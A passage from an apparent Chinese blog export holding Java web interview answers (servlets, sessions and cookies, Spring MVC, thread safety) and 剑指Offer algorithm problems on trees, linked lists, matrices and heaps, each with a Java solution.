安全性,POST的安全性要比GET的安全性高。由于数据是会在地址中呈现，所以可以通过历史记录找到密码等关键信息。 6. 说一下你对servlet的理解？或者servlet是什么？简单说一下servlet的生命周期?Servlet（Server Applet），全称Java Servlet， 是用Java编写的服务器端程序。而这些Sevlet都要实现Servlet这个借口。其主要功能在于交互式地浏览和修改数据，生成动态Web内容。Servlet运行于支持Java的应用服务器中。 HttpServlet 重写doGet和doPost方法或者你也可以重写service方法完成对get和post请求的响应. servlet有良好的生存期的定义，包括加载和实例化、初始化、处理请求以及服务结束。这个生存期由javax.servlet.Servlet接口的init,service和destroy方法表达。 总结而言 加载Servlet的class—-&gt;实例化Servlet—–&gt;调用Servlet的init完成初始化—-&gt;响应请求（Servlet的service方法）—–&gt;Servlet容器关闭时(Servlet的destory方法) 7. forward() 与redirect()的区别？ forward是服务器端的转向而redirect是客户端的跳转。 使用forward浏览器的地址不会发生改变。而redirect会发生改变。 Forward是一次请求中完成。而redirect是重新发起请求。 Forward是在服务器端完成，而不用客户端重新发起请求，效率较高。 8. 说一下session和cookie的区别？你在项目中都有哪些地方使用了？Session和cookie都是会话(Seesion)跟踪技术。Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。但是Session的实现依赖于Cookie,sessionId(session的唯一标识需要存放在客户端). 不同点 cookie数据存放在客户的浏览器上，session数据放在服务器上。 cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session。 session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能,考虑到减轻服务器性能方面，应当使用COOKIE。 单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。 所以个人建议：将登陆信息等重要信息存放为SESSION其他信息如果需要保留，可以放在COOKIE中，比如购物车 9. 简单讲一下SpringMVC的执行流程？ 捕获 用户向服务器发送请求，请求被Spring 前端控制Servelt的DispatcherServlet捕获 查找handler DispatcherServlet对请求URL进行解析，得到请求资源标识符（URI）。然后根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象（包括Handler对象以及Handler对象对应的拦截器），最后以HandlerExecutionChain对象的形式返回； 执行handler，返回一个ModelAndView对象 DispatcherServlet 根据获得的Handler，选择一个合适的HandlerAdapter。 提取Request中的模型数据，填充Handler入参，开始执行Handler（Controller), Handler执行完成后，向DispatcherServlet 返回一个ModelAndView对象 选择ViewResolver DispatcherServlet 根据返回的ModelAndView，选择一个适合的ViewResolver（必须是已经注册到Spring容器中的ViewResolver) 渲染返回 通过ViewResolver 结合Model和View，来渲染视图,DispatcherServlet 将渲染结果返回给客户端。 10. 简单讲一下webservice使用的场景？webservice是一个SOA（面向服务的编程）的架构，它是不依赖于语言，不依赖于平台，可以实现不同的语言间的相互调用，通过Internet进行基于Http协议的网络应用间的交互。 1、异构系统(不同语言)的整合 2、不同客户端的整合 浏览器、手机端(android,ios.塞班)、微信单、PC端等终端来访问 11. i++如何保证线程安全这是美团一面面试官的一个问题，后来发现这是一道面试常见题，怪自己没有准备充分：i++;在多线程环境下是否存在问题？当时回答存在，接着问，那怎么解决？。。。好吧，我说加锁或者synchronized同步方法。接着问，那有没有更好的方法？ 经过一番百度、谷歌，还可以用AtomicInteger这个类，这个类提供了自增、自减等方法（如i++或++i都可以实现），这些方法都是线程安全的。 Java中的自增原理 java代码：1234567public class TestDemo &#123; public static int count; public void code() &#123; count++; &#125;&#125; javap来反编译Java字节码文件： 123456789101112131415161718Compiled from &quot;TestDemo.java&quot;public class Increment.TestDemo &#123; public static int count; public Increment.TestDemo(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public void code(); Code: 0: getstatic #2 // Field count:I 3: iconst_1 4: iadd 5: putstatic #2 // Field count:I 8: return &#125; 如上字节码，我们发现自增操作包括取数（getstatic #2）、加一（iconst_1和iadd）、保存（putstatic #2），并不是我们认为的一条机器指令搞定的。 总结： 要解决自增操作在多线程环境下线程不安全的问题，可以选择使用Java提供的原子类，或者使用synchronized同步方法。 12. 保证线程安全的方法在Java中可以有很多方法来保证线程安全，比如使用同步方法、同步块，使用原子类(atomic concurrent classes)，实现并发锁，使用volatile关键字，使用不变类和线程安全类。 12.1 如何保证线程安全 不在线程之间共享状态变量 将状态变量修改成不可变的变量 在访问状态变量时使用同步 12.2 实现线程安全有那些方法 A：内置锁 B: 使用java.util.concurrent包中定义的并发类 如 ConcurrentHashMap 、ConcurrentLinkedQueue、ConcurrentSkipListMap等等，但是他们支持的并发实现并不一定意味着操作的原子性，他们只是保证数据结构不被破坏 C: 添加volatile关键字 不是原子操作，还是要用synchronized的 D: 同步语句 不要使用this，因为this可能代表当前的类，this造成同步的区域是整个类，其他对象就无法调用类中不是同步的方法了，需要等待锁从this指的类中释放才能进行了。所以你可以定义一个对象，然后让同步块的锁指向整个对象来缩小同步块的锁影响范围。 E: 不要跨线程访问共享变量 F: 使共享变量是final类型的 String类型的对象，是保存在堆里还是在栈里呢？在Java的实现中，new出来的String对象一般是放在堆中的。 如果是 String s =”xxx”; 这种,那就是放在常量池中. JDK6将常量池放在方法区中。 方法区此时也是持久代。 但是从JDK7开始, 常量池的实现 已经从方法区中移出来放到 堆内存里面了。]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题67：机器人运动范围】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9867%EF%BC%9A%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4%E3%80%91%2F</url>
    <content type="text"><![CDATA[机器人运动范围. 题目描述地上有一个m行和n列的方格。一个机器人从坐标0,0的格子开始移动，每一次只能向左，右，上，下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于k的格子。 例如，当k为18时，机器人能够进入方格（35,37），因为3+5+3+7 = 18。但是，它不能进入方格（35,38），因为3+5+3+8 = 19。请问该机器人能够达到多少个格子？ 解题思路与上题类似 代码实现1234567891011121314151617181920212223242526272829303132public class Solution &#123; public int movingCount(int threshold, int rows, int cols) &#123; //根据m行n列的方格，构造一个数组来标识是否已经判断过，已经判断过的话置为true，否则置为false //这里初始化默认是false boolean[][] flag = new boolean[rows][cols]; //下面开始走，边走边判断周围是否符合 //judge(初始横坐标i，初始横坐标j，行数，列数，k值，标识是否走过) return judge(0,0,rows,cols,threshold,flag); &#125; private int judge(int i,int j,int rows,int cols,int threshold,boolean[][] flag)&#123; //越界、flsg=true说明已经走过，就不要再走了、行坐标和列坐标的数位之和大于k也跳过 if(i&lt;0 || j&lt;0 || i&gt;=rows || j&gt;=cols || flag[i][j]==true || getK(i)+getK(j)&gt;threshold) return 0; //机器人从[0,0]出发，必定是满足的，先置为true,所以要先加个1 flag[i][j] = true; //基于回溯的思想，就是到达一个格子后，不断地判断他的周围四个格子是否满足要求，递归判断下去，必定走遍所有格子 return judge(i-1,j,rows,cols,threshold,flag)+ judge(i,j-1,rows,cols,threshold,flag)+ judge(i+1,j,rows,cols,threshold,flag)+ judge(i,j+1,rows,cols,threshold,flag)+1; &#125; private int getK(int num)&#123; int sum = 0; do&#123; sum += num%10; &#125;while((num=num/10) &gt; 0); return sum; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题66：矩阵中的路径】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9866%EF%BC%9A%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84%E3%80%91%2F</url>
    <content type="text"><![CDATA[矩阵中的路径. 题目描述请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。 例如 a b c e s f c s a d e e 矩阵中包含一条字符串”bcced”的路径，但是矩阵中不包含”abcb”路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入该格子。 解题思路基本思想： 根据给定数组，初始化一个标志位数组，初始化为false，表示未走过，true表示已经走过，不能走第二次 根据行数和列数，遍历数组，先找到一个与str字符串的第一个元素相匹配的矩阵元素，进入judge 根据i和j先确定一维数组的位置，因为给定的matrix是一个一维数组 确定递归终止条件：越界，当前找到的矩阵值不等于数组对应位置的值，已经走过的，这三类情况，都直接false，说明这条路不通 若k，就是待判定的字符串str的索引已经判断到了最后一位，此时说明是匹配成功的 下面就是本题的精髓，递归不断地寻找周围四个格子是否符合条件，只要有一个格子符合条件，就继续再找这个符合条件的格子的四周是否存在符合条件的格子，直到k到达末尾或者不满足递归条件就停止。 走到这一步，说明本次是不成功的，我们要还原一下标志位数组index处的标志位，进入下一轮的判断。 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344public class Solution &#123; public boolean hasPath(char[] matrix, int rows, int cols, char[] str) &#123; //标志位，初始化为false boolean[] flag = new boolean[matrix.length]; for(int i=0;i&lt;rows;i++)&#123; for(int j=0;j&lt;cols;j++)&#123; //循环遍历二维数组，找到起点等于str第一个元素的值，再递归判断四周是否有符合条件的----回溯法 if(judge(matrix,i,j,rows,cols,flag,str,0))&#123; return true; &#125; &#125; &#125; return false; &#125; //judge(初始矩阵，索引行坐标i，索引纵坐标j，矩阵行数，矩阵列数，待判断的字符串，字符串索引初始为0即先判断字符串的第一位) private boolean judge(char[] matrix,int i,int j,int rows,int cols,boolean[] flag,char[] str,int k)&#123; //先根据i和j计算匹配的第一个元素转为一维数组的位置 int index = i*cols+j; //递归终止条件 if(i&lt;0 || j&lt;0 || i&gt;=rows || j&gt;=cols || matrix[index] != str[k] || flag[index] == true) return false; //若k已经到达str末尾了，说明之前的都已经匹配成功了，直接返回true即可 if(k == str.length-1) return true; //要走的第一个位置置为true，表示已经走过了 flag[index] = true; //回溯，递归寻找，每次找到了就给k加一，找不到，还原 if(judge(matrix,i-1,j,rows,cols,flag,str,k+1) || judge(matrix,i+1,j,rows,cols,flag,str,k+1) || judge(matrix,i,j-1,rows,cols,flag,str,k+1) || judge(matrix,i,j+1,rows,cols,flag,str,k+1) ) &#123; return true; &#125; //走到这，说明这一条路不通，还原，再试其他的路径 flag[index] = false; return false; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题65：滑动窗口的最大值】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9865%EF%BC%9A%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC%E3%80%91%2F</url>
    <content type="text"><![CDATA[滑动窗口的最大值. 题目描述给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。例如，如果输入数组{2,3,4,2,6,2,5,1}及滑动窗口的大小3，那么一共存在6个滑动窗口，他们的最大值分别为{4,4,6,6,6,5}； 针对数组{2,3,4,2,6,2,5,1}的滑动窗口有以下6个： {[2,3,4],2,6,2,5,1}， {2,[3,4,2],6,2,5,1}， {2,3,[4,2,6],2,5,1}， {2,3,4,[2,6,2],5,1}， {2,3,4,2,[6,2,5],1}， {2,3,4,2,6,[2,5,1]}。 解题思路每次用一个ArrayList来存放窗口内的数，进行排序，然后得到最大的添加进外面的ArrayList中，最后返回。 代码实现12345678910111213141516171819202122public class Solution &#123; /********************比较简单粗暴的方法************************ 比较好的方法是双端队列法，但是有点看不懂 ************************************************************/ public ArrayList&lt;Integer&gt; maxInWindows(int [] num, int size) &#123; List&lt;Integer&gt; result = new ArrayList&lt;&gt;(); if(num.length == 0 || size == 0) return (ArrayList)result; for(int i=0;i&lt;=num.length-size;i++)&#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for(int j=i;j&lt;i+size;j++)&#123; list.add(num[j]); &#125; Collections.sort(list); result.add(list.get(size-1)); &#125; return (ArrayList)result; &#125; &#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题64：数据流中的中位数】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9864%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0%E3%80%91%2F</url>
    <content type="text"><![CDATA[数据流中的中位数. 题目描述如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。 解题思路/***********方式一、用两个优先队列来模拟两个堆---主要思路************************ 1.先用java集合PriorityQueue来设置一个小顶堆和大顶堆，大顶堆需要先重写一下里面的比较器 2.主要的思想是：因为要求的是中位数，那么这两个堆，大顶堆用来存较小的数，从大到小排列； 小顶堆存较大的数，从小到大的顺序排序， 显然中位数就是大顶堆的根节点与小顶堆的根节点和的平均数。 保证：小顶堆中的元素都大于等于大顶堆中的元素，所以每次塞值，并不是直接塞进去，而是从另一个堆中poll出一个最大（最小）的塞值 3.当数目为偶数的时候，将这个值插入大顶堆中，再将大顶堆中根节点（即最大值）插入到小顶堆中； 当数目为奇数的时候，将这个值插入小顶堆中，再讲小顶堆中根节点（即最小值）插入到大顶堆中； 这样就可以保证，每次插入新值时，都保证小顶堆中值大于大顶堆中的值，并且都是有序的。 4.由于第一个数是插入到小顶堆中的，所以在最后取中位数的时候，若是奇数，就从小顶堆中取即可。 这样，当count为奇数的时候，中位数就是小顶堆的根节点；当count为偶数的时候，中位数为大顶堆和小顶堆两个根节点之和的平均数 5.例如，传入的数据为：[5,2,3,4,1,6,7,0,8],那么按照要求，输出是&quot;5.00 3.50 3.00 3.50 3.00 3.50 4.00 3.50 4.00 &quot; a.那么，第一个数为5，count=0,那么存到小顶堆中， 步骤是：先存到大顶堆；然后弹出大顶堆root，就是最大值给小顶堆，第一次执行完，就是小顶堆为5，count+1=1； 此时若要输出中位数，那么就是5.0，因为直接返回的是小顶堆最小值(第一次塞入到小顶堆中，是从大顶堆中找到最大的给他的) b.继续传入一个数为2，那么先存到小顶堆中，将小顶堆最小值弹出给大顶堆，即2，那么这次执行完，小顶堆为5，大顶堆为2，count+1=2 此时若要输出中位数，因为是偶数，那么取两个头的平均值，即(5+2)/2=3.5(第二次塞入到大顶堆中，是从小顶堆中找到最小的给他的) c.继续传入一个数为3，那么此时count为偶数，那么执行第一个if，先存到大顶堆中，大顶堆弹出最大值，那么3&gt;2，就是弹出3 3存到小顶堆中，那么此时小顶堆为3,5，大顶堆为2，count+1=3(第三次塞入到小顶堆中，是从大顶堆中找到最大的给他的) 此时若要输出中位数，因为是奇数，那么取小顶堆的最小值，即3.0 d.继续传入一个数为4，先存到小顶堆中，小顶堆此时为3,4，5,弹出最小值为3，给大顶堆 此时大顶堆为3,2,小顶堆为4,5，(第四次塞入到小顶堆中，是从大顶堆中找到最大的给他的) 此时若要输出中位数，因为是偶数，那么取两个头的平均值,即(3+4)/2=3.5 e.依次类推。。。 ******************************************/ /***************方式二、ArrayList*********************** 用ArrayList来存输入的数据流，然后每次用Collections.sort(list)来保证数据流有序，然后再取中位数 思想非常简单，但是每次都要进行排序，时间复杂度可想而知 ****************************************/ /***************方式三、插入排序，插入到对应的位置*********************** LinkedList&lt;Integer&gt; data = new LinkedList&lt;Integer&gt;(); public void Insert(Integer num) { for (int i = data.size() - 1; i &gt;= 0 ; i--) { if (num &gt;= data.get(i)){ data.add(i+1,num); return; } } data.addFirst(num); } ****************************************/ 代码实现123456789101112131415161718192021222324252627282930313233int count = 0;private PriorityQueue&lt;Integer&gt; minHeap = new PriorityQueue&lt;&gt;();//默认是小根堆private PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;Integer&gt;(15, new Comparator&lt;Integer&gt;() &#123; @Override public int compare(Integer o1, Integer o2) &#123; return o2 - o1; &#125;&#125;);public void Insert(Integer num) &#123; if(count%2 == 0)&#123; //数目为偶数时，插入到小根堆中 maxHeap.offer(num); int filteredMaxNum = maxHeap.poll(); minHeap.offer(filteredMaxNum); &#125;else&#123; //数目为奇数时，插入到大根堆中 minHeap.offer(num); int filteredMinNum = minHeap.poll(); maxHeap.offer(filteredMinNum); &#125; count++;&#125;public Double GetMedian() &#123; if (count %2 == 0) &#123; return new Double((minHeap.peek() + maxHeap.peek())) / 2; &#125; else &#123; return new Double(minHeap.peek()); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题63：二叉搜索树的第K个节点】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9863%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E7%AC%ACK%E4%B8%AA%E8%8A%82%E7%82%B9%E3%80%91%2F</url>
    <content type="text"><![CDATA[二叉搜索树的第K个节点. 题目描述给定一颗二叉搜索树，请找出其中的第k大的结点。例如， -------------------- 5 / \ 3 7 / \ / \ 2 4 6 8 -------------------- 中，按结点数值大小顺序第三个结点的值为4。 解题思路因为二叉搜索树的中序遍历就是按照值从小到大排序的，所以用中序遍历得出解。 代码实现123456789101112131415161718192021222324import java.util.List;import java.util.LinkedList;public class Solution &#123; List&lt;TreeNode&gt; list = new LinkedList&lt;&gt;(); TreeNode KthNode(TreeNode pRoot, int k) &#123; if(k == 0 || pRoot == null)&#123; return null; &#125; List&lt;TreeNode&gt; result = inOrder(pRoot); if(k&gt;result.size())&#123; return null; &#125; return result.get(k-1); &#125; private List&lt;TreeNode&gt; inOrder(TreeNode root)&#123; if(root != null)&#123; inOrder(root.left); list.add(root); inOrder(root.right); &#125; return list; &#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题62：序列化二叉树】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9862%EF%BC%9A%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%2F</url>
    <content type="text"><![CDATA[序列化二叉树. 题目描述请实现两个函数，分别用来序列化和反序列化二叉树 解题思路所谓二叉树序列化就是将二叉树变成字符串；所谓反序列化，就是将这个字符串还原为二叉树而已。这里用层序遍历实现。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//层序遍历来序列化import java.util.LinkedList;import java.util.Queue;public class Solution &#123; String Serialize(TreeNode root) &#123; StringBuilder sb = new StringBuilder(); Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); //先把二叉树根节点放进队列，下面进行层序遍历，如果碰到空，就放"#" if(root != null) queue.offer(root); while(!queue.isEmpty())&#123; TreeNode node = queue.poll(); if(node != null)&#123; queue.offer(node.left); queue.offer(node.right); sb.append(node.val+","); &#125;else&#123; sb.append("#,"); &#125; &#125; //去掉序列化后字符串的最后的一个逗号 if(sb.length() != 0)&#123; sb.deleteCharAt(sb.length()-1); &#125; //返回序列化后的字符串 return sb.toString(); &#125; TreeNode Deserialize(String str) &#123; TreeNode head = null; if(str == null || str.length() == 0) return head; //先把序列化后的字符串转为字符串数组 String[] valChar = str.split(","); //相应地建立同样长度的TreeNode数组 TreeNode[] nodeArray = new TreeNode[valChar.length]; //遍历字符串数组，如果不是"#"，就将其转为TreeNode for(int i=0;i&lt;valChar.length;i++)&#123; if(!valChar[i].equals("#")) nodeArray[i] = new TreeNode(Integer.valueOf(valChar[i])); &#125; //对TreeNode数组进行树化 for(int i=0,j=1;i&lt;valChar.length;i++)&#123; if(nodeArray[i] != null)&#123; nodeArray[i].left = nodeArray[j++]; nodeArray[i].right = nodeArray[j++]; &#125; &#125; return nodeArray[0]; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题61：把二叉树打印成多行】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9861%EF%BC%9A%E6%8A%8A%E4%BA%8C%E5%8F%89%E6%A0%91%E6%89%93%E5%8D%B0%E6%88%90%E5%A4%9A%E8%A1%8C%E3%80%91%2F</url>
    <content type="text"><![CDATA[把二叉树打印成多行. 题目描述从上到下按层打印二叉树，同一层结点从左至右输出。每一层输出一行。 解题思路说穿了就是层序遍历，只是按照他的要求输出一下。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445import java.util.List;import java.util.ArrayList;import java.util.LinkedList;public class Solution &#123; ArrayList&lt;ArrayList&lt;Integer&gt; &gt; Print(TreeNode pRoot) &#123; //存放返回结果 ArrayList&lt;ArrayList&lt;Integer&gt;&gt; resultList = new ArrayList&lt;&gt;(); //如果为空，直接返回 if(pRoot == null) return resultList; //表示某一行节点的数量 int num = 0; //用于存放每一行节点对象的list LinkedList&lt;TreeNode&gt; nodeList = new LinkedList&lt;&gt;(); //先将根节点放进去 nodeList.add(pRoot); //下面就是获取每一行节点，添加进去 while(!nodeList.isEmpty())&#123; num = nodeList.size(); ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); while(num &gt; 0)&#123; TreeNode root = nodeList.pop(); if(root.left != null)&#123; nodeList.add(root.left); intList.add(root.left.val); &#125; if(root.right != null)&#123; nodeList.add(root.right); intList.add(root.right.val); &#125; num--; &#125; if(!intList.isEmpty())&#123; resultList.add(intList); &#125; &#125; //不要忘记根节点也要放进去 ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); intList.add(pRoot.val); resultList.add(0,intList); return resultList; &#125; &#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题60：按之字形顺序打印二叉树】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9860%EF%BC%9A%E6%8C%89%E4%B9%8B%E5%AD%97%E5%BD%A2%E9%A1%BA%E5%BA%8F%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%2F</url>
    <content type="text"><![CDATA[按之字形顺序打印二叉树. 题目描述请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。 解题思路 层序遍历 用栈来存，因为偶数层是反序输出的 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class Solution &#123; public ArrayList&lt;ArrayList&lt;Integer&gt; &gt; Print(TreeNode pRoot) &#123; ArrayList&lt;ArrayList&lt;Integer&gt; &gt; resultList = new ArrayList&lt;&gt;(); if(pRoot == null) return resultList; //记录二叉树的层数用来判断是奇数还是偶数层 int layer = 1; //s1存放奇数层数据，从左到右；2存放偶数层数据，从右到左 Stack&lt;TreeNode&gt; s1 = new Stack&lt;&gt;(); s1.push(pRoot); Stack&lt;TreeNode&gt; s2 = new Stack&lt;&gt;(); while (!s1.isEmpty() || !s2.isEmpty()) &#123; if(layer%2 != 0)&#123; //是奇数层，那么是按照从左到右顺序存储的 ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); //s1中存储的都是奇数层的节点，下面一一进行pop出来 while(!s1.isEmpty())&#123; TreeNode node = s1.pop(); if(node != null)&#123; list.add(node.val); //存储的时候，注意是先存储节点的左子节点，再存储节点的右子节点，这样s2出栈是以偶数层的逆序出栈的 s2.push(node.left); s2.push(node.right); &#125; &#125; //添加进结果集，并且增加layer if(!list.isEmpty())&#123; layer++; resultList.add(list); &#125; &#125;else&#123; //是偶数层，那么是按照从右到左顺序存储的 ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); while(!s2.isEmpty())&#123; TreeNode node = s2.pop(); if(node != null)&#123; //存储的时候，注意是先存储节点的右子节点，再存储节点的左子节点，这样s1出栈是以奇数层的顺序出栈的 list.add(node.val); s1.push(node.right); s1.push(node.left); &#125; &#125; //添加进结果集，并且增加layer if(!list.isEmpty())&#123; layer++; resultList.add(list); &#125; &#125; &#125; return resultList; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题59：对称的二叉树】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9859%EF%BC%9A%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%2F</url>
    <content type="text"><![CDATA[对称的二叉树. 题目描述请实现一个函数，用来判断一颗二叉树是不是对称的。注意，如果一个二叉树同此二叉树的镜像是同样的，定义其为对称的。 解题思路数本身天然递归，判断一颗二叉树是不是对称的： 最简单的情况就是只有一个节点，那么是True 再加两个节点呢，也很简单，就是判断左右子树的值是否相等 那如果是三层呢？好像情况变得越来越复杂了。就是要判断最左边和最右边是否相等，依次向内判断。 下面的问题，其实就是理解递归的问题了。 代码实现1234567891011121314151617public class Solution &#123; boolean isSymmetrical(TreeNode pRoot) &#123; if(pRoot == null) return true; return isSymmetrical(pRoot.left,pRoot.right); &#125; private boolean isSymmetrical(TreeNode left,TreeNode right)&#123; if(left == null || right == null) return left == right; if(left.val != right.val) return false; return isSymmetrical(left.left,right.right) &amp;&amp; isSymmetrical(left.right,right.left); &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题58：二叉树的下一个结点】]]></title>
    <url>%2F2018%2F08%2F05%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9858%EF%BC%9A%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%BB%93%E7%82%B9%E3%80%91%2F</url>
    <content type="text"><![CDATA[二叉树的下一个结点. 题目描述给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。 解题思路 分析二叉树的下一个节点，一共有以下情况： 1.二叉树为空，则返回空； 2.节点右孩子存在，则设置一个指针从该节点的右孩子出发，一直沿着指向左子结点的指针找到的叶子节点即为下一个节点； 3.节点不是根节点。如果该节点是其父节点的左孩子，则返回父节点；否则继续向上遍历其父节点的父节点，重复之前的判断，返回结果。 是不是有点绕，没办法。 代码实现1234567891011121314151617181920212223242526272829303132333435363738/*public class TreeLinkNode &#123; int val; TreeLinkNode left = null; TreeLinkNode right = null; TreeLinkNode next = null;//注意这个是指向该节点的父节点的 TreeLinkNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public TreeLinkNode GetNext(TreeLinkNode pNode) &#123; if(pNode == null) return null; //存在右子树，那么下一个节点为右子树最下面的左子节点 if(pNode.right != null)&#123; TreeLinkNode node = pNode.right; while(node.left != null)&#123; node = node.left; &#125; return node; //pNode只存在左子树的情况，并且pNode是其父节点的左子节点，那么pNode下一个节点就是其父节点 &#125;else if(pNode.next != null &amp;&amp; pNode.next.left == pNode)&#123; return pNode.next; //pNode只存在左子树的情况，并且pNode是其父节点的右子节点，那么从其父节点往上找，直到找到第一个节点，满足其左子节点就是刚才的父节点位置 &#125;else if(pNode.next != null &amp;&amp; pNode.next.right == pNode)&#123; while(pNode.next != null &amp;&amp; pNode.next.left != pNode)&#123; pNode = pNode.next; &#125; return pNode.next; &#125;else&#123; return pNode.next; &#125; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题57：删除链表中重复的结点】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9857%EF%BC%9A%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E7%BB%93%E7%82%B9%E3%80%91%2F</url>
    <content type="text"><![CDATA[删除链表中重复的结点. 题目描述在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留，返回链表头指针。 例如，链表1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 处理后为 1-&gt;2-&gt;5 解题思路这种删除重复节点的情况，因为要考虑头结点也是重复节点的情况，所以一般的方法是创建一个虚拟节点指向头结点，然后搞两个指针，一个指向当前节点，一个指向前一个节点，保证链表不截断。 代码实现1234567891011121314151617181920212223242526public class Solution &#123; public ListNode deleteDuplication(ListNode pHead) &#123; ListNode dummy = new ListNode(0); dummy.next = pHead; ListNode pre = dummy; ListNode curr = pHead; while(curr != null)&#123; //当前节点和下一个节点的值重复，那么就全部踢出 if(curr.next != null &amp;&amp; curr.val == curr.next.val)&#123; int val = curr.val; while(curr != null &amp;&amp; curr.val == val)&#123; curr = curr.next; &#125; pre.next = curr; //不重复，向后移动一个指针即可 &#125;else&#123; pre = curr; curr = curr.next; &#125; &#125; return dummy.next; &#125;&#125;]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题56：链表中环的入口节点】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%9856%EF%BC%9A%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E8%8A%82%E7%82%B9%E3%80%91%2F</url>
